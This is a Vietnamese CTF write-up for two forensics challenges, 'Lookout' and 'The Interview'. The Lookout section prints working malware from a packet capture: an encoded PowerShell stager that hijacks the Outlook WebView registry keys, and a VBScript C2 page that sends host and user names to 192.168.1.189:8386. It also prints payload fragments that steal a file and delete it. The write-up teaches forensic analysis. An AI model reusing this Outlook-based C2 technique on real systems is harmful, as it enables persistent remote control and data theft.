---
title: (VietNamese) BKISC CTF 2026 Writeup (Author)
date: 2026-5-11 05:19:33
top_img: /img/bkisc/bkisc.png
cover: /img/bkisc/bkisc.png
categories:
  - Forensics
  - Writeup CTF
toc: true
---
> Trong cuộc thi `BKISC CTF 2026` năm nay, mình có giải một thử thách mảng Forensics , cảm ơn anh KangTheConq đã làm chall hay như v và thx a sealth2103 hint e solve :x


# Forensic / Lookout
![image](https://hackmd.io/_uploads/rkqtpYRRZl.png)
Mở chall thì mình thấy 1 file pcap ở desktop
![image](https://hackmd.io/_uploads/HkB-k5AC-e.png)
File pcap này khá nhiều trafic nhưng mình lọc thấy get 1 file report.txt
![image](https://hackmd.io/_uploads/HkS6k5CCWx.png)
Nội dung trong file như sau 
```

Invoke-Command ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JAB0AGUAbQBwAFIAZQBnAEYAaQBsAGUAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAVABlAG0AcABGAGkAbABlAE4AYQBtAGUAKAApACAAKwAgACIALgByAGUAZwAiAA0ACgANAAoAJAByAGUAZwBDAG8AbgB0AGUAbgB0ACAAPQAgAEAAIgANAAoAVwBpAG4AZABvAHcAcwAgAFIAZQBnAGkAcwB0AHIAeQAgAEUAZABpAHQAbwByACAAVgBlAHIAcwBpAG8AbgAgADUALgAwADAADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADYALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADUALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADQALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEUAeAB0AFwAUwB0AGEAdABzAFwAewAyADYAMQBCADgAQwBBADkALQAzAEIAQQBGAC0ANABCAEQAMAAtAEIAMABDADIALQBCAEYAMAA0ADIAOAA2ADcAOAA1AEMANgB9AFwAaQBlAHgAcABsAG8AcgBlAF0ADQAKACIARgBsAGEAZwBzACIAPQBkAHcAbwByAGQAOgAwADAAMAAwADAAMAAwADQADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEkAbgB0AGUAcgBuAGUAdAAgAFMAZQB0AHQAaQBuAGcAcwBcAFoAbwBuAGUAcwBcADIAXQANAAoAIgAxADQAMABDACIAPQBkAHcAbwByAGQAOgAwADAAMAAwADAAMAAwADAADQAKACIAMQAyADAAMAAiAD0AZAB3AG8AcgBkADoAMAAwADAAMAAwADAAMAAwAA0ACgAiADEAMgAwADEAIgA9AGQAdwBvAHIAZAA6ADAAMAAwADAAMAAwADAAMwANAAoAIgBAAA0ACgANAAoAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJAB0AGUAbQBwAFIAZQBnAEYAaQBsAGUAIAAtAFYAYQBsAHUAZQAgACQAcgBlAGcAQwBvAG4AdABlAG4AdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAVQBuAGkAYwBvAGQAZQANAAoAJgAgAHIAZQBnAC4AZQB4AGUAIABpAG0AcABvAHIAdAAgACIAYAAiACQAdABlAG0AcABSAGUAZwBGAGkAbABlAGAAIgAiAA0ACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAHQAZQBtAHAAUgBlAGcARgBpAGwAZQAgAC0ARgBvAHIAYwBlAA0ACgA='))))
```
Decode ra được script 
```powershell
$tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"

$regContent = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
"Flags"=dword:00000004

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
"140C"=dword:00000000
"1200"=dword:00000000
"1201"=dword:00000003
"@

Set-Content -Path $tempRegFile -Value $regContent -Encoding Unicode
& reg.exe import "`"$tempRegFile`""
Remove-Item -Path $tempRegFile -Force

```
Nội dung script trên
```
### 🔍 Phân tích nhanh PowerShell script (Base64)

**Chức năng chính:**
- Giải mã chuỗi Base64 → tạo nội dung `.reg`
- Ghi file registry tạm → import bằng `reg.exe`
- Xóa file sau khi chạy

**Hành vi đáng ngờ:**
1. **Chèn URL vào Outlook WebView**
   - Thêm vào:
     - `HKCU\Software\Microsoft\Office\14.0/15.0/16.0\Outlook\Webview\Inbox`
   - Giá trị:
     - `http://192.168.1.189:8386/plugin/search/`
   → Có thể dùng để inject nội dung / theo dõi email

2. **Giảm mức bảo mật Internet Settings**
   - Sửa các key trong:
     - `...\Internet Settings\Zones\2`
   → Cho phép script/ActiveX → tăng nguy cơ khai thác

3. **Ghi vào Explorer Stats**
   - Có thể dùng để tracking hoặc persistence
```

 `GET /plugin/search/`
```
GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
Connection: Keep-Alive


HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
Content-Type: text/html; charset=UTF-8
Date: Wed, 01 Oct 2025 01:14:30 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Content-Length: 3010

<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="refresh" content="10">
<meta http-equiv="Cache-Control" content=NO-CACHE, no-store, must-revalidate, max-age=0" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="EXPIRES" CONTENT="0">
<title>Outlook</title>
<style>
body {
overflow: hidden;
border: 0px;
padding: 0px;
margin: 0px;
}
</style>
<script id=clientEventHandlersVBS language=vbscript>
<!--
On Error Resume Next
Function GetEnvironment()
On Error Resume Next
Set sh = outlookapp.CreateObject("Wscript.Shell")
compname = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
usern = sh.ExpandEnvironmentStrings("%USERNAME%")
r = BaseDecode(compname & "|" & usern,1)
GetEnvironment = r
End Function
Function SetRegKey(subkey,value,valuetype)
On Error Resume Next
Set oL = outlookapp.CreateObject("Wscript.Shell")
ol.RegWrite subkey, value, valuetype
End Function
Function BaseDecode(value, LE)
On Error Resume Next
With outlookapp.CreateObject("Msxml2.DOMDocument").CreateElement("aux")
.DataType = "bin.base64"
if LE then
.NodeTypedValue = StrToBytes(value, "utf-16le", 2)
else
.NodeTypedValue = StrToBytes(value, "utf-8", 3)
end if
BaseDecode = .Text
End With
End Function
Function requestpage(uri, rR)
On Error Resume Next
vi = Left(outlookapp.version,4)
d = rR
set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
oP.open "POST", uri,false
oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
oP.setRequestHeader "Content-Length", Len(d)
oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
oP.setOption 2, 13056
oP.send Replace(d, vbLf, "")
requestpage = oP.responseText
End Function
Function StrToBytes(strn, cset, pos)
On Error Resume Next
With outlookapp.CreateObject("ADODB.Stream")
.Type = 2
.Charset = cset
.Open
.WriteText strn
.Position = 0
.Type = 1
.Position = pos
StrToBytes = .Read
.Close
End With
End function
O = ""
uriloc = "http://192.168.1.189:8386/plugin/search/"
Set outlookapp = window.external.OutlookApplication
Sub window_onload()
O = GetEnvironment()
rul = requestpage(uriloc, chr(34) & O & chr(34))
if not rul = "" Then
Set box = outlookapp.GetNameSpace("MAPI")
Set fold = box.GetDefaultFolder(9)
val1 = SetRegKey("HKCU\" & "Software\Microsoft\Office\"  & Left(outlookapp.version,4) & "\Outlook\UserInfo" & "\" & "KEY", Split(rul,"||")(0), "REG_SZ")
val2 = SetRegKey("HKCU\Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\Webview\Inbox\URL", Split(rul,"||")(1), "REG_SZ")
val3 = SetRegKey("HKCU\Software\Microsoft\Internet Explorer\Styles\MaxScriptStatements", &Hffffffff, "REG_DWORD")
Set outlookapp.ActiveExplorer.CurrentFolder = fold
End if
End Sub
-->
</script>
</head>
<body>
<object classid="CLSID:0006F063-0000-0000-C000-000000000046" id="SpeculaViewID" data="" width="100%" height="100%"></object>
</body>
</html>
GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive


HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:14:41 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"


GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive


HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:14:51 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"


GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive


HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:15:01 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"


GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive


HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:15:11 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"


```
Giải thích
```
### 🔍 Tóm tắt hành vi script

- **PowerShell (giai đoạn 1):**
  - Giải mã Base64 → tạo và import file `.reg`
  - Chèn URL độc (`http://192.168.1.189:8386/...`) vào Outlook WebView
  - Hạ mức bảo mật Internet Settings

- **Outlook WebView (giai đoạn 2):**
  - Tự động gọi đến server nội bộ :contentReference[oaicite:0]{index=0}
  - Nhận HTML + VBScript và thực thi trong Outlook
  - Thu thập thông tin máy (username, computer name)
  - Gửi về server và nhận lệnh điều khiển
  - Tiếp tục sửa registry để duy trì truy cập

- **Cơ chế tổng thể:**
  - PowerShell → sửa registry → Outlook load WebView → chạy script → kết nối C2

- **Kết luận:**
  👉 Đây là **malware/backdoor nhiều giai đoạn**, lợi dụng Outlook để điều khiển máy từ xa
```
Trong ouput có 1 dòng là : `o4WlfbKbx1xik1TgTQGeOQ` chatlgpt bảo có thể là key để xor nên mình note lại

Export các object thì thấy attacker gửi các file `rUe38nls`
![image](https://hackmd.io/_uploads/SyX3IN8Jfg.png)
- Các file 5 bytes là các file trạng thái gọi là `Mã hóa trạng thái` trong file mình thấy mã 20010 Vậy nó làm gì ví dụ :
    - `20010`: "Chờ đợi lệnh tiếp theo" (Sleep/Idle).
    - `20011`: "Bắt đầu trích xuất danh bạ".
    - `20012`: "Tải và thực thi payload mới".
- Còn các file có dung lượng lớn hơn là các payload được gửi từ C2 đến máy nạn nhân
 Ref : [CVE-2017-11774](https://nvd.nist.gov/vuln/detail/cve-2017-11774)

Script decode pyload
```python
#!/usr/bin/env python3
import re

PCAP = "capture.pcapng"
KEY  = "o4WlfbKbx1xik1TgTQGeOQ"

def giai_ma(hex_str):
    """XOR hex -> bytes, tu dong phat hien encoding"""
    hex_only = re.sub(r'[^0-9a-fA-F]', '', hex_str)
    if len(hex_only) < 4:
        return "", 0
    raw = bytes.fromhex(hex_only)
    result = bytearray(raw[i] ^ ord(KEY[i % len(KEY)]) for i in range(len(raw)))
    
    # Thu Latin-1
    text = result.decode('latin-1', errors='replace')
    high = sum(1 for c in text if ord(c) > 127)
    
    # Neu >30% byte cao -> UTF-16LE
    if high > len(text) * 0.3:
        try:
            text = result.decode('utf-16-le')
        except:
            pass
    
    return text, len(result)

print("=" * 60)
print("Dang doc pcap...")
print("=" * 60)

with open(PCAP, 'rb') as f:
    data = f.read()

stt = 0
idx = 0
while True:
    # Tim response tu C2 server
    resp = data.find(b'Server: Microsoft-IIS/8.5', idx)
    if resp < 0:
        break
    
    # Lay Content-Length
    cl_match = re.search(rb'Content-Length: (\d+)', data[resp:resp+300])
    if not cl_match:
        idx = resp + 1
        continue
    
    cl = int(cl_match.group(1))
    idx = resp + 1
    
    if cl < 50:  # Bo qua response rong (type 2)
        continue
    
    # Lay body
    body_start = data.find(b'\r\n\r\n', resp)
    if body_start < 0:
        continue
    body_start += 4
    body = data[body_start:body_start + cl]
    body_text = body.decode('latin-1', errors='replace').strip()
    
    if len(body_text) < 5 or not body_text[0].isdigit():
        continue
    
    f = body_text[0]
    j = body_text[1:5]
    
    if f == '2':  # Type 2 = khong lam gi
        continue
    
    decrypted, sz = giai_ma(body_text[5:])
    if sz < 20:
        continue
    
    # Chi giu payload co lenh
    if not any(kw in decrypted for kw in ['Function', 'Sub ', 'Dim ', 'End Function']):
        continue
    
    stt += 1
    print(f"\n{'='*60}")
    print(f"[+] Payload #{stt} | Type: {f} | ID: {j} | Size: {sz} bytes")
    print(f"{'-'*60}")
    print(decrypted)

print(f"\n{'='*60}")
print(f"Tong cong: {stt} payload co lenh")

```
Out put
```

    Payload #4-5: get_file()
    vbscript
    Function get_file()
        Set file = fs.GetFile("C:\Users\BKISC\Desktop\flag.py")
        get_file = file.size  ' = 684 bytes -> flag.py TON TAI!
    End Function


    Payload #6: download_file() ← QUAN TRỌNG
    vbscript
    Function download_file()
        Set file = fs.GetFile("C:\Users\BKISC\Desktop\flag.py")
        readBinary = .Read(684)           ' Doc noi dung flag.py
        download_file = readBinary         ' Tra ve noi dung
    End Function
    Ohm = crypthelper(download_file(), ay, True)  ' Ma hoa XOR
    rul = requestpage("http://192.168.1.189:8386/...", Ohm)  ' GUI LEN C2!


    Dòng Ohm = crypthelper(download_file(), ay, True) gọi Mode=True → XOR từng byte với key o4WlfbKbx1xik1TgTQGeOQ, xuất ra hex.

    Kết quả được gửi lên C2 qua POST request. Trong pcap, tôi tìm POST body dài nhất (vì flag.py 684 bytes) → thấy hex string bắt đầu bằng 4C141D1915166B...

    Payload #7: delete_file()
    vbscript
    Function delete_file()
        fs.DeleteFile "C:\Users\BKISC\Desktop\flag.py"  ' XOA flag.py!
    End Function
```
Nhiệm vụ 7 payload : 
```
- #1-3: dir_lister() — liệt kê thư mục (lặp lại)
- #4-5: get_file() — kiểm tra flag.py tồn tại (bị hiển thị sai encoding nhưng vẫn đúng)
- #6: download_file() — đọc nội dung flag.py (quan trọng!)
- #7: delete_file() — xóa flag.py
```
Tìm nội dung payload 6
Và chạy script 
```
#!/usr/bin/env python3
import re

KEY = "o4WlfbKbx1xik1TgTQGeOQ"

# Chuoi hex da tim duoc
hex_str = """
4C141D1915166B100D5F581D035474043B3522453B3E4F53321846162307585714080C113808385C4D6845350A52773E255663091D4858534B532D1331226B453F3D0E5D3918031A3F4242111A101F54274E6E5C4D456F714F677751460E22110C190A080556314F6664714C665C6514774C46086B5F58017563663B74477471210A3D7106143E0246102A0C1F54505B5E077D5D595B67456F714F14774C0C427642505B58424B620F0E09716C452434166F3E4C434227071619130C1218094E747467577A67623E774C46426B4258112B32026C7847070A2D386F6C4F670C063B4E6B31235825494B3C5E6A5E7167456F384F097706465F6B52753B58494B11370E243922173B34174077514639166F721158494B573B1574322F043D71065A771C0A03220C0C54001D513C5E47747167456F714F5D7751464A2242531149404B14745561674A6F6F714F14774C46422142451150034B1A74340F381A4C6F744F06625A6B686B42581158494B11073C3D0C6B451C0A0569775146311008251D583A30580947745C4D456F714F14774C46166B5F58192B32026C744C74021C0F12784F11775E53544668581158494B1174473F717A451C0A1B695A6646426B42581158490858240F3123330037254155271C030C2F4A1B59191B4B6F740C7D5C4D6845714F14771E03163E1016111A101F54274F3738370D2A231B512F184F6F416F725A1D104B0C7405763D280A2430035D3C09050A22011354164B663B240B353829112A291B146A4C04457004196D0050536D2C046D0D3F547C0D17576F301E5A723E005519351301603B2C342339373359682F5D5F3E335B406D000F0F56124A082976511C0D17556F473A1A2D57486D000A5F41081F3268773937335D123D301E5273535F3C721919583A137C030451673A0A4D7B4C160E2A0B16451D111F187A03313228012A79461D
"""

print("[*] Dang giai ma XOR...")

# Lam sach hex
hex_only = re.sub(r'[^0-9a-fA-F]', '', hex_str)

# Chuyen hex -> bytes
raw = bytes.fromhex(hex_only)

# XOR decrypt
result = bytearray(
    raw[i] ^ ord(KEY[i % len(KEY)])
    for i in range(len(raw))
)

flag_py = result.decode('latin-1')

# Luu file
with open("flag.py", "w", encoding="utf-8") as f:
    f.write(flag_py)

print(f"\n{'='*60}")
print("DA GIAI MA XONG")
print(f"{'='*60}")
print(flag_py)
print(f"{'='*60}")

print(f"\n[*] Da luu flag.py ({len(flag_py)} bytes)")
```
Flag `BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}`

# Forensics / The Interview
![image](https://hackmd.io/_uploads/rJf0uELyGe.png)

## Part 1 : xor calender event + sms
Bài này mình dùng tool https://github.com/abrignoni/ALEAPP để phân tích cho tiện ( anh em nao thich kho dam thi dung sqlite3 cung duoc xD)
Trong calender mình tìm được event `ronaldoisthechampionofworldcup2026 ` , nhìn là biết đáng ngờ <('')
![image](https://hackmd.io/_uploads/Sk50t4IJGg.png)

Theo suy đoán thì dùng event trên làm key để xor với đoạn base64 dưới
![image](https://hackmd.io/_uploads/HJsJjNIJGx.png)
```py
import base64

KEY = b"ronaldoisthechampionofworldcup2026"

MESSAGES = {
    10: "JgcLEwlEDhsWVAlFBQ0WTQQBBgAIFVcbHUwPBhAAEllcFh8GAAVMBgoPHAYNRRcABE0ZBxsLHRAeCgVC",
    11: "Nh0LEh9ECQYBGQkJDxFBDB4NTwsBDBgWUhULFgcDV1xUGA==",
    12: "NQABBUwIGgoYWEgEDQxBJFcFA04IDwEKUhULFlUERV8SVx8OFAgCA08dGx0GAhBIEwQXARtOAQkAQQ==",
    13: "Ig4cFV1eTys4PTsmGA5RHxUHHAYGEigCHQ4NDxBDQW9bRS0ZXRMVHTBaR0EROgEdVg==",
    14: "OgYAFUwCABtTBAkXF0hTV1A9BwtPEwQKAEwMAgZQVl9FWB4ADwUJAE8IUwcYAAABAAFQDg4DCl1XGwAVRBcaUEVZXBYGBw8VTAMOBBZaYg=="
}

def xor_decode(encoded_text: str, key: bytes) -> bytes:
    raw = base64.b64decode(encoded_text)
    return bytes(
        raw[i] ^ key[i % len(key)]
        for i in range(len(raw))
    )

for sms_id, encoded_msg in MESSAGES.items():
    decoded = xor_decode(encoded_msg, KEY)

    print(f"[SMS {sms_id}]")
    print("Decoded :", decoded.decode(errors="replace"))
    print("Hex     :", decoded.hex())
    print("-" * 60)
    
    ''' OUtPUT của Code trên
    [SMS 10]
Decoded : There are a few things to keep in mind before the interview.
Hex     : 546865726520617265206120666577207468696e677320746f206b65657020696e206d696e64206265666f72652074686520696e746572766965772e
------------------------------------------------------------
[SMS 11]
Decoded : Dress formally and enjoy yourself.
Hex     : 447265737320666f726d616c6c7920616e6420656e6a6f7920796f757273656c662e
------------------------------------------------------------
[SMS 12]
Decoded : Good luck, and I'll give you two amazing things right now.
Hex     : 476f6f64206c75636b2c20616e642049276c6c206769766520796f752074776f20616d617a696e67207468696e6773207269676874206e6f772e
------------------------------------------------------------
[SMS 13]
Decoded : Part1: BKISC{f0renshit_mobile3s_is_v3ryy_345y_bu7
Hex     : 50617274313a20424b4953437b663072656e736869745f6d6f62696c6533735f69735f76337279795f333435795f627537
------------------------------------------------------------
[SMS 14]
Decoded : Hint for part 2: The user has downloaded a special game; try to win that game.

Hex     : 48696e7420666f72207061727420323a2054686520757365722068617320646f776e6c6f616465642061207370656369616c2067616d653b2074727920746f2077696e20746861742067616d652e0a'''
```
Flag part 1 : BKISC{f0renshit_mobile3s_is_v3ryy_345y_bu7

## Part 2 : Reverse APK SpaceRunner Game
>Thanks gpt and sealth2103

![image](https://hackmd.io/_uploads/SJgK7HLkMe.png)
Code get part 2
```py
    public final String getPart2() {
        if (!this.victory) {
            return "Keep flying, pilot!";
        }
        byte[] buffer = new byte[35];
        for (int i = 0; i < 7; i++) {
            byte[] chunk = fetchBufferPart(i);
            for (int j = 0; j < 5; j++) {
                int idx = (i * 5) + j;
                buffer[idx] = (byte) (chunk[j] ^ computeMagic(idx));
            }
        }
        return new String(buffer, Charsets.UTF_8);
    }

```
App lấy các mảng byte từ fetchBufferPart(), sau đó XOR với giá trị được sinh bởi computeMagic() để tạo plaintext cuối cùng:
`buffer[idx]= (byte) (chunk[j]^computeMagic(idx));`

Sau đó decode thì chúng ta có mảng 2
```py
chunks = [
    [76, 66, 44, 13, 32],
    [69, 119, 29, 39, 89],
    [38, 0, 125, 80, 29],
    [1, 102, 90, 118, 7],
    [76, 89, 118, 29, 102],
    [69, 39, 54, 122, 68],
    [29, 7, 35, 67, 29]
]

def compute_magic(i):
    m = i % 4
    if m < 1:
        return 19
    elif m < 2:
        return 55
    elif m < 3:
        return 66
    else:
        return 105

buffer = []

for i in range(7):
    chunk = chunks[i]
    for j in range(5):
        idx = (i * 5) + j
        buffer.append(chunk[j] ^ compute_magic(idx))

print(bytes(buffer).decode())
```
Part2 :  `_und3r5t4nding_hum4n_n4ture_is_n0t_`
## Part 3 : Osint
Trong repo của SpaceRunnerGame
https://github.com/NhoXanh1807/SpaceRunnerGame
Readme có clue `Find her social media.`
Trong data có các thông tin sau
Email : thuminh689099@gmail.com
github : NhoXanh1807 

Tra username thuminh689099 thì có các social x.com , IG , Tiktok
![image](https://hackmd.io/_uploads/rkXXZH8yzl.png)
![image](https://hackmd.io/_uploads/rkxHWHI1fg.png)
![image](https://hackmd.io/_uploads/rybu-SI1Mg.png)



Trong tw có 
tweet 1 : link pastebin bị khóa
tweet 2 : The password is what the rocket needs to fly (Pls enter within 3 digits after the decimal points: zz.zzz,yy.yyy)

![image](https://hackmd.io/_uploads/ryoR-BLyfl.png)
End giải mình vẫn k tìm được địa chỉ ảnh trong video tiktok nên đã đi hỏi địa chỉ <(')

Chỉ cần nhập tọa độ`10.798,106.708` đại học uef với hồng bàng vào pw pastebin là ra flag 
![image](https://hackmd.io/_uploads/SJA6GrUkGe.png)

Flag : `BKISC{f0renshit_mobile3s_is_v3ryy_345y_bu7_und3r5t4nding_hum4n_n4ture_is_n0t_s0_be_c4uti0us_e5peci4lly_w1th_BKISCmembers}`


